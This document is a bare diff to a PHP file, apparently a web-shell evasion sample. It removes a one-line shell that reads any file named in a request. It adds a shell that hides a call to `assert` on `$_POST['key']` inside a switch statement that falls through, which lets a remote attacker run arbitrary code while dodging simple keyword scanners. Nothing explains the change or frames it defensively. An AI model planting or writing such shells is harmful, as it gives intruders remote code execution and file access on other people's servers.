@@ -1,1 +1,17 @@
-<?php readfile($_REQUEST[1]);?>
+
+<?php 
+
+switch('yes')
+
+{
+  case 'no':break;
+
+  case 'yes':
+
+  $a="assert";
+
+    default:$a($_POST['key']);
+
+}
+
+?>
